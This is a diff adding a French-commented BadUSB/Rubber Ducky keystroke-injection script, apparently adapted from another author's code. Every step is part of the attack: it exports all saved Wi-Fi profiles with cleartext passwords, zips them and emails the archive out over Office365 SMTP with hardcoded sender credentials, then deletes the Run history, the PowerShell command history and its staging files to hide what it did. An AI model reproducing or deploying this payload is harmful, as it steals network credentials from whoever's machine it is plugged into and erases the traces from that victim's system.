@@ -1,0 +1,86 @@
+REM Basé sur le code de @norepository
+REM: Version 1.0 en français
+REM *** Adapté par @fatouh4ck***
+DELAY 2000
+GUI d
+DELAY 150
+GUI r
+DELAY 400
+STRING cmd
+ENTER
+DELAY 500
+STRING color FE & mode con:cols=18 lines=1
+ENTER
+REM --> Récupération des mdp
+STRING cd Desktop
+ENTER
+STRING mkdir A
+ENTER
+STRING cd A
+ENTER
+STRING netsh wlan export profile key=clear 
+ENTER
+DELAY 200
+STRING cd ..
+ENTER
+STRING powershell
+ENTER
+STRING Compress-Archive -Path A -DestinationPath A.zip
+ENTER
+REM --> Envoi via Outlook SMTP
+DELAY 500
+STRING $SMTPServer = 'smtp.office365.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL-SENDER', 'M9ifz%28Kd')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'EMAIL-SENDER'
+ENTER
+STRING $ReportEmail.To.Add('EMAIL-RECEIVER')
+ENTER
+STRING $ReportEmail.Subject = "Wi-fi passwords report"
+ENTER
+STRING $ReportEmail.Body = "GG, you got it ! code modified by github.com/fatouh4ck"
+ENTER
+STRING $ReportEmail.Attachments.Add("A.zip")
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 400
+REM --> Nettoyage
+STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+ENTER
+STRING cd ..
+ENTER
+STRING cd AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+ENTER
+STRING del ConsoleHost_history.txt
+ENTER
+STRING exit
+ENTER
+DELAY 100
+STRING del C:\Users\Utilisateur\Desktop\A & rmdir C:\Users\Utilisateur\Desktop\A
+ENTER
+STRING O
+ENTER
+STRING del C:\Users\Utilisateur\Desktop\A.zip & exit
+ENTER
+REM --> Tout s'est bien passé (partie optionnelle)
+DELAY 500
+GUI r
+DELAY 400
+STRING notepad
+ENTER
+DELAY 500
+STRING Tout s'est bien passé, fin dans 3 secondes...
+DELAY 3000
+ALT f4
+DELAY 200
+RIGHT
+DELAY 200
+ENTER
